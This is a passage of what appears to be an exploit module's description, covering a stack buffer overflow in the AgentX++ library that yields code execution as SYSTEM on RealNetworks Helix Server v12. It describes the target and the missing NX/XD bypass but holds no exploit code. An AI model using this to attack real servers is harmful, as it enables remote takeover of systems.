          This exploits a stack buffer overflow in the AgentX++ library, as used by
        various applications. By sending a specially crafted request, an attacker can
        execute arbitrary code, potentially with SYSTEM privileges.

        This module was tested successfully against master.exe as included with Real
        Network\'s Helix Server v12. When installed as a service with Helix Server,
        the service runs as SYSTEM, has no recovery action, but will start automatically
        on boot.

        This module does not work with NX/XD enabled but could be modified easily to
        do so. The address
